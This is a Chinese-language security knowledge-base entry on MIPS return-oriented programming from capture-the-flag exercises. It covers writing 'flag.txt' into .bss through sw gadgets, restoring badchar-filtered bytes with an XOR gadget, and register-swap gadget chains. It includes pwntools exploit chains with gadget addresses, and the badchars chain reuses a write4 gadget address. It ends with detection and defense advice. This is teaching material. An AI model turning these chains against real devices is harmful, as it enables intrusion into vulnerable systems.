---
id: binary-pwn-rop-mips-bss-string-write-badchars-xor
title: MIPS ROP 构造字符串到 .bss：sw 任意写、badchar XOR 解码与 fluff 寄存器交换
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips-rop-bss-string-write-badchars-xor
aliases:
- MIPS write4
- MIPS badchars
- MIPS fluff
- MIPS 任意写 gadget
- .bss 写 flag.txt
- XOR 解码 badchar
- 寄存器交换 gadget
tags:
- mips
- mipsel
- rop
- arbitrary-write
- badchars
- xor
- gadget
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:40:12+08:00'
  notes: 已对照原文1534-2096行核对：write4 gadget 0x400930、badchars 0x400948（x/g/a/.→0xEB）、fluff 6段gadget语义与原文一致；修正两处PoC：write4的gadget_call 0x400944自带addi sp,0x10需4个0xaa填充（原稿仅1个会错位），badchars调用gadget与print_file应分别为0x400968/0x400AB0（原稿误用write4题地址）；修正后已kb verify
---

## 一句话结论

MIPS ROP 需要把 `flag.txt` 一类字符串写进可写的 .bss 时，可按 gadget 能力分三种打法：有 `lw $t0,8($sp); lw $t1,4($sp); sw $t1,0($t0); lw $t9,0xC($sp); jalr $t9` 就直接分 4 字节写；输入被 badchar 过滤（如 `x/g/a/.` 被替换为 0xEB）就先写 XOR 编码值，再用 `lw $t2,0($t1); xor $t0,$t2; sw $t0,0($t1)` gadget 在内存中还原；没有简单写 gadget 时用 fluff 的 `xor $s1,$s1` / `xor $s1,$s2` / 三次 xor 交换 `$s0/$s1` / `sw $s1,0($s0)` 组合，把字符串先构造进寄存器再落盘。

## 原理

- **MIPS 的“任意写”通常来自 sw gadget**：`lw $t1,4($sp)` 从栈取 4 字节值、`lw $t0,8($sp)` 取目标地址、`sw $t1,0($t0)` 写入；`lw $t9,0xC($sp); jalr $t9` 决定写完跳到哪。把 .bss 地址（原文 0x411000）放进 `$t0`、把 `flag`/`.txt` 放进 `$t1`，连续两次即可写入 `flag.txt`，再用 `lw $a0,8($sp); lw $t9,4($sp); jalr $t9` 调 `print_file(buf)`。
- **badchar 过滤**：程序把输入中的 `x`、`g`、`a`、`.` 全部替换成 `0xEB`，直接写 `flag.txt` 会被破坏。思路是让写入的值在发送时不含 badchar，落到 .bss 后再用 XOR gadget 还原：`lw $t2,0($t1)` 读当前 dword、`xor $t0,$t2` 与栈上掩码异或、`sw $t0,0($t1)` 写回。对 `"flag"` 中 `a`/`g` 被替换成 0xEB 的位置，用掩码 `0xEB^'a'`、`0xEB^'g'` 异或即可还原；`.txt` 同理用 `0xEB^'.'`、`0xEB^'x'`。发送的编码值本身可以避开四个 badchar。
- **fluff 的寄存器构造**：给出的 gadget 不直接提供 `sw $t1,0($t0)`，而是：
  1. `xor $s1,$s1` 清空 s1；
  2. `lw $s2,4($sp)` 设置 s2；
  3. `xor $s1,$s2` 给 s1 赋值（若 s1 已清零，则 s1=s2）；
  4. `xor $s0,$s1; xor $s1,$s0,$s1; xor $s0,$s1` 交换 s0/s1；
  5. `sw $s1,0($s0)` 把 s1 写到 s0 指向地址；
  6. `lw $a0,8($sp); lw $t9,4($sp); jalr $t9` 调用函数。
  通过“s1=0 → s2=目标地址 → s1=s2 → 交换得到 s0=目标地址、s1=0”，再用同样方法把 s1 设为字符串值，最后 `sw` 落盘；每 4 字节重复一次。
- **为什么可行**：这些 gadget 都是程序/库中已有的合法指令片段，`$s0-$s2` 由栈恢复、可逐段控制；MIPS 固定 4 字节指令使 gadget 边界清晰，`jalr $t9` 的延迟槽由 `addi $sp`/`nop` 处理，链式排布可预测。

## 触发条件

- MIPS32 程序存在栈溢出且可 ROP；程序或 libc 中存在上述写/异或/交换 gadget。
- 需要把字符串（文件名、命令、`/bin/sh`）写到已知可写地址（.bss/堆固定地址），且程序没有直接提供该字符串。
- badchar 场景下，输入过滤会替换/删除特定字节，直接写入会破坏目标字符串。
- 端序已知，能按 mipsel/mipseb 正确打包 4 字节值。

## 利用步骤

1. 用 checksec/IDA 确认无 PIE（.bss 地址固定），找可写地址（如 0x411000）。
2. 用 mipsrop/ROPgadget 找写 gadget（`sw $t1,0($t0)`）、XOR gadget（`xor $t0,$t2; sw $t0,0($t1)`）、调用 gadget（`lw $a0,off($sp); lw $t9,...; jalr $t9`）。
3. write4：按 `[gadget, dummy, t1值, t0地址, 下一跳]` 排布两次，分别写 `flag` 与 `.txt`；最后调用 `print_file(buf)`。
4. badchars：先确认 badchar 集合与替换字节（原文 0x78/0x67/0x61/0x2E → 0xEB）；把目标字符串按 4 字节分组，对含 badchar 的字节计算掩码 `0xEB ^ 原字节`；先用写 gadget 把“编码后”的值写入（编码值本身避开 badchar），再用 XOR gadget 对同一地址异或掩码还原；逐组处理完后调用 `print_file(buf)`。
5. fluff：若没有直接写 gadget，按 `s1=0 → s2=地址 → s1=s2 → 交换 → s2=字符串值 → s1=值 → sw` 的顺序，用 6 段 gadget 逐 4 字节写；最后调用函数。
6. 发送 payload，确认 `print_file` 打开 `flag.txt` 并输出内容。

## PoC

```python
# write4（原文 exp 核心）
gadget_write = 0x0400930   # lw t9,0xC(sp); lw t0,8(sp); lw t1,4(sp); sw t1,0(t0); jalr t9; addi sp,0x10
gadget_call  = 0x0400944   # 入口先 addi sp,0x10，再落入 0x400948: lw a0,8(sp); lw t9,4(sp); jalr t9
print_file   = 0x0400A90
buf = 0x411000
rop = ROP(elf)
rop.raw(gadget_write); rop.raw(0xded); rop.raw(b"flag"); rop.raw(buf); rop.raw(gadget_write)
rop.raw(0xded); rop.raw(b".txt"); rop.raw(buf+4); rop.raw(gadget_call)
# gadget_call 自带 addi sp,0x10，需按其消耗用 0xaa 填够 0x10 字节再放调用参数
rop.raw(0xaa); rop.raw(0xaa); rop.raw(0xaa); rop.raw(0xaa)
rop.raw(0xded); rop.raw(print_file); rop.raw(buf)
payload = cyclic(0x24) + rop.chain()
```

```python
# badchars：写入后用 XOR gadget 还原被 0xEB 替换的字节（本题二进制地址与 write4 不同）
gadget_xor = 0x0400948   # lw t9,0xC(sp); lw t0,8(sp); lw t1,4(sp); lw t2,0(t1); xor t0,t2; sw t0,0(t1); jalr t9
gadget_call_badchars = 0x0400968  # lw a0,8(sp); lw t9,4(sp); jalr t9; addi sp,0xC
print_file = 0x0400AB0
# 对 "flag" 的 a/g 与 ".txt" 的 ./x 分别计算掩码 0xEB^原字节
rop.raw(gadget_write); rop.raw(0xaa); rop.raw(b"flag"); rop.raw(buf); rop.raw(gadget_write)
rop.raw(0xaa); rop.raw(b".txt"); rop.raw(buf+4); rop.raw(gadget_xor)
rop.raw(0xcc); rop.raw(buf); rop.raw(b"\x00\x00" + bytes([ord('a')^0xeb, ord('g')^0xeb])); rop.raw(gadget_xor)
rop.raw(0xdd); rop.raw(buf+4); rop.raw(bytes([ord('.')^0xeb,0,ord('x')^0xeb,0])); rop.raw(gadget_call_badchars)
rop.raw(0xee); rop.raw(print_file); rop.raw(buf)
```

fluff 的寄存器构造要点（原文 6 段 gadget）：`xor s1,s1` → `lw s2,addr` → `xor s1,s2` → 三次 xor 交换 s0/s1 → `sw s1,0(s0)`，每 4 字节重复，最后 `lw a0,8(sp); lw t9,4(sp); jalr t9` 调 `print_file`。

## 变体与关联

- **无 XOR gadget**：可用 `add/sub` gadget 或直接把编码值写成程序可接受的等价路径（如利用 `system` 参数拼接）；badchar 也可通过寄存器移位/字节交换 gadget 绕过。
- **无写 gadget**：fluff 的寄存器构造是通用替代；若连 `sw` 都没有，考虑栈迁移到可写区后用 `read` 再读入字符串，或 ret2csu 调用 read/write。
- **关联**：[[binary-pwn-rop-mips32-stack-frame-gadget-args]] 是 MIPS ROP 基础；[[binary-pwn-rop-mips-pivot-got-libpivot-ret2win]] 展示栈迁移 + GOT 泄露；[[binary-pwn-rop-mips-ret2csu-libc-csu-init]] 展示 csu gadget 设参。

## 检测与防御

- **检测**：MIPS ROP 链中出现连续的 `sw $t1,0($t0)`、`xor`/`sw` 组合 gadget；输入中包含与 badchar 替换字节对应的 XOR 掩码；.bss 固定地址出现 `flag.txt`/`/bin/sh` 等字符串。
- **防御**：启用 PIE/ASLR 去掉固定 .bss 地址；输入过滤不要只用固定单字节替换（易被 XOR 还原）；对敏感字符串（文件名/命令）使用服务端白名单，避免用户可控。
- **响应**：监控异常 ROP 链与 .bss 写入；保留崩溃现场分析 gadget 使用。
